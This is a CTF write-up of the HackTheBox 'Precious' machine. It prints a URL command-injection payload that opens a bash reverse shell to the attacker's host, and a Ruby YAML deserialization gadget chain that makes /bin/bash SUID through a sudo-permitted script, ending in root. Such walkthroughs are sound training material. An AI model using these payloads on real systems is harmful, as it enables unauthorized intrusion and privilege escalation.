Writeup Precious HackTheBox

Resolution of the Precious machine from the HackTheBox platform

We start by scanning the ports of the machine with nmap

❯ nmap 10.10.11.189
Nmap scan report for 10.10.11.189
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

By doing a simple curl on the headers we can see the domain precious.htb

❯ curl -s 10.10.11.189 -I | grep Location:
Location: http://precious.htb/

On the web we can see... a web to pdf converter?

Create a server with python to see if it makes any requests

❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Now we point to our http server and hit submit

It makes a request to our http service, but it also downloads a pdf

❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - "GET / HTTP/1.1" 200 -

❯ ls -l

In the following article shows us a payload, we change the sleep for a revshell

http://example.com/?name=#{'%20`sleep 5`'}

http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1 "`'}

We simply paste our payload with the reverse shell and send it

Now in our listener we have the revshell as ruby

Looking at sudoers permissions, we can run a ruby file as root

henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
     secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
     (root) NOPASSWD: /usr/bin/ruby /opt/ update_dependencies.rb
henry@precious:~$

If we read the file we can see that in one part it tries to load dependencies.yml

henry@precious:~$ cat /opt/update_dependencies.rb | head -n11 | tail -n3
def list_from_file
     YAML.load(File.read("dependencies.yml"))
end
henry@precious:~$

We can create the dependencies.yml file in the current directory with the following payload as content for us to run a command to do the bash suid

henry@precious:~$ cat dependencies.yml
---
- !ruby/object:Gem::Installer
     i:x
- !ruby/object:Gem::SpecFetcher
     i:y
- !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: chmod u+s /bin/bash
          method_id: :resolve
henry@precious:~$

Now when executing the ruby script and loading the yml, it will execute the command and the bash will be suid

henry@precious:~$ sudo ruby /opt/update_dependencies.rb 2>/dev/null
henry@precious:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash
henry@precious:~$

We run bash as the propieratio and we are root now we can read the flag

henry@precious:~$ bash -p

bash-5.1# hostname -I
